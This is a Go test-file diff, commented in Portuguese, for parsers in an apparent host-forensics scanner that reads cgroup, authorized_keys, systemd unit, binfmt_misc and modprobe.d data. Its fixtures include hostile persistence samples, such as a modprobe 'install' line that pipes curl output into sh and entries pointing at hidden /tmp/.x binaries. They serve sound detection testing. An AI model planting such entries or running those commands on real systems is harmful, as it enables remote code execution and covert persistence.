@@ -1,6 +1,12 @@
 package facts
 
-import "testing"
+import (
+	"os"
+	"strings"
+	"testing"
+
+	"github.com/lex0c/aletheia/internal/env"
+)
 
 // Tabela de FORMA CONDICIONAL dos parsers de /proc e /sys.
 //
@@ -129,5 +135,195 @@ func TestParseHexAddrOrdemDePalavra(t *testing.T) {
 			t.Errorf("%s: parseHexAddr(%q) = %s:%d,%v — quer %s:%d,%v",
 				c.nome, c.in, ip, porta, ok, c.ip, c.porta, c.ok)
 		}
+	}
+}
+
+// /proc/PID/cgroup tem DUAS gramáticas na mesma leitura, e proc_cgroup_show
+// (kernel/cgroup/cgroup.c) escreve as duas: `%d:` da hierarquia, depois a lista
+// de controladores — VAZIA para a raiz unificada (v2) —, depois `:` e o
+// caminho. No v1 há uma LINHA POR CONTROLADOR, e só a de `name=systemd` carrega
+// a unit: pegar a primeira, que pode ser cpuset ou freezer, destrói a
+// proveniência que este campo existe para preservar quando o PPid vira 1.
+func TestParseCgroupDuasGramaticas(t *testing.T) {
+	casos := []struct{ nome, texto, quer string }{
+		{"v2 puro", "0::/system.slice/nginx.service", "/system.slice/nginx.service"},
+		{"v1 com systemd", "8:cpuset:/\n5:freezer:/\n1:name=systemd:/system.slice/ssh.service",
+			"/system.slice/ssh.service"},
+		{"v1 sem systemd cai no primeiro", "8:cpuset:/docker/abc\n5:freezer:/docker/abc",
+			"/docker/abc"},
+		// HÍBRIDO (v1 e v2 montados juntos, que é o padrão de várias distros com
+		// systemd.unified_cgroup_hierarchy=0): as DUAS linhas aparecem, e é a de
+		// name=systemd que carrega a unit — a linha `0::` ali costuma trazer só
+		// a raiz. Preferir o v2 por ser "mais moderno" perderia justamente a
+		// proveniência que este campo existe para preservar.
+		{"hibrido: name=systemd carrega a unit",
+			"1:name=systemd:/system.slice/x.service\n0::/",
+			"/system.slice/x.service"},
+		// O caminho pode conter ':' — o SplitN em 3 é o que preserva isso.
+		{"caminho com dois-pontos", "0::/system.slice/x:y.service", "/system.slice/x:y.service"},
+		{"linha truncada é ignorada", "0::\n1:name=systemd:/ok.service", ""},
+		{"vazio", "", ""},
+	}
+	for _, c := range casos {
+		if got := parseCgroup(c.texto); got != c.quer {
+			t.Errorf("%s: parseCgroup = %q, quer %q", c.nome, got, c.quer)
+		}
+	}
+}
+
+// authorized_keys aceita um bloco de OPÇÕES antes do tipo da chave, e é ali que
+// mora a persistência: `command=` força um comando a cada login, e o valor é
+// entre aspas e pode conter espaço, vírgula e aspas escapadas. Cortar no
+// primeiro espaço ou na primeira vírgula quebra o bloco e faz a chave inteira
+// ser lida errado — inclusive o fingerprint, que é como ela é reconhecida.
+func TestParseAuthorizedKeyComOpcoes(t *testing.T) {
+	const blob = "AAAAC3NzaC1lZDI1NTE5AAAAIExemploDeChaveParaTeste"
+	casos := []struct{ nome, linha, tipo, opts, coment string }{
+		{"sem opções", "ssh-ed25519 " + blob + " ana@host", "ssh-ed25519", "", "ana@host"},
+		{"opção simples", "no-pty ssh-ed25519 " + blob + " x", "ssh-ed25519", "no-pty", "x"},
+		{"command com espaço", `command="/usr/bin/rsync --server" ssh-ed25519 ` + blob + " x",
+			"ssh-ed25519", `command="/usr/bin/rsync --server"`, "x"},
+		{"command com vírgula dentro das aspas",
+			`command="/bin/sh -c 'a,b'",no-pty ssh-ed25519 ` + blob + " x",
+			"ssh-ed25519", `command="/bin/sh -c 'a,b'",no-pty`, "x"},
+		{"from com curinga", `from="10.0.0.*,!10.0.0.5" ssh-rsa ` + blob + " x",
+			"ssh-rsa", `from="10.0.0.*,!10.0.0.5"`, "x"},
+		{"sem comentário", "ssh-ed25519 " + blob, "ssh-ed25519", "", ""},
+	}
+	for _, c := range casos {
+		k := parseAuthorizedKey(c.linha)
+		if k.Type != c.tipo {
+			t.Errorf("%s: tipo=%q, quer %q", c.nome, k.Type, c.tipo)
+		}
+		if k.Options != c.opts {
+			t.Errorf("%s: opções=%q, quer %q", c.nome, k.Options, c.opts)
+		}
+		if k.Comment != c.coment {
+			t.Errorf("%s: comentário=%q, quer %q", c.nome, k.Comment, c.coment)
+		}
+		if c.tipo != "" && k.Fingerprint == "" {
+			t.Errorf("%s: sem fingerprint — a chave não é reconhecível", c.nome)
+		}
+	}
+}
+
+// Unit de systemd tem três formas condicionais que mudam o que é lido:
+// continuação de linha com `\`, prefixos de execução (`-@+!!!`) que o systemd
+// aceita antes do caminho, e `ExecStart=` VAZIO, que RESETA a lista — é assim
+// que um drop-in substitui o comando da unit original, e ler isso errado faz o
+// relatório acusar um ExecStart que não roda mais.
+func TestParseUnitFileFormasCondicionais(t *testing.T) {
+	escrever := func(t *testing.T, corpo string) Unit {
+		t.Helper()
+		raiz := t.TempDir()
+		p := raiz + "/x.service"
+		if err := os.WriteFile(p, []byte(corpo), 0o644); err != nil {
+			t.Fatal(err)
+		}
+		e := env.Probe(env.Options{Root: raiz, Version: "test"})
+		t.Cleanup(func() { e.Close() })
+		return parseUnitFile(e, "/x.service", "system", false)
+	}
+
+	t.Run("continuacao de linha", func(t *testing.T) {
+		u := escrever(t, "[Service]\nExecStart=/usr/bin/app \\\n  --flag \\\n  --outra\n")
+		if len(u.Exec) != 1 {
+			t.Fatalf("a continuação tinha de virar UM comando: %+v", u.Exec)
+		}
+		if !strings.Contains(u.Exec[0].Cmd, "--flag") || !strings.Contains(u.Exec[0].Cmd, "--outra") {
+			t.Errorf("as continuações se perderam: %q", u.Exec[0].Cmd)
+		}
+	})
+
+	t.Run("ExecStart vazio reseta", func(t *testing.T) {
+		u := escrever(t, "[Service]\nExecStart=/usr/bin/legitimo\nExecStart=\nExecStart=/tmp/.x\n")
+		if len(u.Exec) != 1 || !strings.Contains(u.Exec[0].Cmd, "/tmp/.x") {
+			t.Errorf("o `ExecStart=` vazio RESETA: só o último vale, veio %+v", u.Exec)
+		}
+	})
+
+	t.Run("multiplos ExecStart acumulam", func(t *testing.T) {
+		u := escrever(t, "[Service]\nExecStartPre=/bin/a\nExecStart=/bin/b\nExecStartPost=/bin/c\n")
+		if len(u.Exec) != 3 {
+			t.Errorf("Pre, Start e Post são três comandos: %+v", u.Exec)
+		}
+	})
+
+	t.Run("comentario e secao nao viram chave", func(t *testing.T) {
+		u := escrever(t, "# ExecStart=/tmp/.fake\n; ExecStart=/tmp/.fake2\n[Service]\nExecStart=/bin/ok\n")
+		if len(u.Exec) != 1 || !strings.Contains(u.Exec[0].Cmd, "/bin/ok") {
+			t.Errorf("comentário não executa nada: %+v", u.Exec)
+		}
+	})
+}
+
+// O registro de binfmt_misc tem DELIMITADOR ARBITRÁRIO: o primeiro byte da
+// linha é o separador, e o formato é
+// :nome:tipo:offset:magic:mask:interpretador:flags. Quem fixar ':' não lê o
+// registro que usa '|' — e o delimitador é escolha de quem escreve o arquivo,
+// ou seja, do adversário.
+func TestParseBinfmtLinhaDelimitadorArbitrario(t *testing.T) {
+	casos := []struct {
+		nome, linha, interp, flags string
+		ok                         bool
+	}{
+		{"delimitador dois-pontos", ":qemu:M::\\x7fELF::/usr/bin/qemu-arm:OCF",
+			"/usr/bin/qemu-arm", "OCF", true},
+		{"delimitador barra vertical", "|evil|M||\\x7fELF||/tmp/.x|F",
+			"/tmp/.x", "F", true},
+		{"delimitador cerquilha", "#x#E##.foo##/tmp/.y#", "/tmp/.y", "", true},
+		{"sem interpretador é recusado", ":x:M::\\x7fELF:::", "", "", false},
+		{"campos de menos", ":x:M:", "", "", false},
+		{"linha curta demais", ":", "", "", false},
+	}
+	for _, c := range casos {
+		got, ok := parseBinfmtLinha(c.linha)
+		if ok != c.ok {
+			t.Errorf("%s: ok=%v, quer %v", c.nome, ok, c.ok)
+			continue
+		}
+		if !ok {
+			continue
+		}
+		if got.Interpreter != c.interp {
+			t.Errorf("%s: interpretador=%q, quer %q", c.nome, got.Interpreter, c.interp)
+		}
+		if got.Flags != c.flags {
+			t.Errorf("%s: flags=%q, quer %q", c.nome, got.Flags, c.flags)
+		}
+	}
+}
+
+// modprobe.d: `install` e `alias` EXECUTAM, `blacklist` e `options` não. E o
+// comando pode ter qualquer número de tokens — juntá-lo errado perde o payload.
+func TestLerModprobeSoAsDiretivasQueExecutam(t *testing.T) {
+	raiz := t.TempDir()
+	if err := os.MkdirAll(raiz+"/etc/modprobe.d", 0o755); err != nil {
+		t.Fatal(err)
+	}
+	corpo := "# comentário\n" +
+		"blacklist nouveau\n" +
+		"options snd slots=x\n" +
+		"install evil /bin/sh -c 'curl http://e|sh'\n" +
+		"alias net-pf-99 /tmp/.x\n" +
+		"install truncado\n"
+	if err := os.WriteFile(raiz+"/etc/modprobe.d/x.conf", []byte(corpo), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	e := env.Probe(env.Options{Root: raiz, Version: "test"})
+	defer e.Close()
+	f := &Facts{}
+	lerModprobe(f, e, "/etc/modprobe.d/x.conf")
+
+	if len(f.Modules) != 2 {
+		t.Fatalf("só install e alias executam; blacklist, options e a linha "+
+			"truncada não: %+v", f.Modules)
+	}
+	if f.Modules[0].Kind != "install" || !strings.Contains(f.Modules[0].Cmd, "curl") ||
+		!strings.Contains(f.Modules[0].Cmd, "|sh") {
+		t.Errorf("o comando inteiro precisa sobreviver: %+v", f.Modules[0])
+	}
+	if f.Modules[1].Kind != "alias" || f.Modules[1].Cmd != "/tmp/.x" {
+		t.Errorf("alias: %+v", f.Modules[1])
 	}
 }
